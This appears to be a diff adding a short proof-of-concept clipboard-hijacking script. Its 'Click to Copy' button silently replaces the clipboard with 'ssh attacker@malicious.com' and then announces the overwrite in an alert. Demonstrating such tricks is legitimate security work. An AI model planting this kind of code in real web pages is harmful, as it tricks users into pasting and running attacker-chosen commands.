@@ -1,0 +1,17 @@
+<script>
+  async function injectClipboard() {
+    try {
+      await navigator.clipboard.writeText("ssh attacker@malicious.com");
+      alert("✅ Clipboard overwritten silently.");
+    } catch (e) {
+      alert("❌ Clipboard write failed: " + e);
+    }
+  }
+
+  window.onload = () => {
+    const btn = document.createElement("button");
+    btn.textContent = "Click to Copy";
+    btn.onclick = injectClipboard;
+    document.body.appendChild(btn);
+  };
+</script>
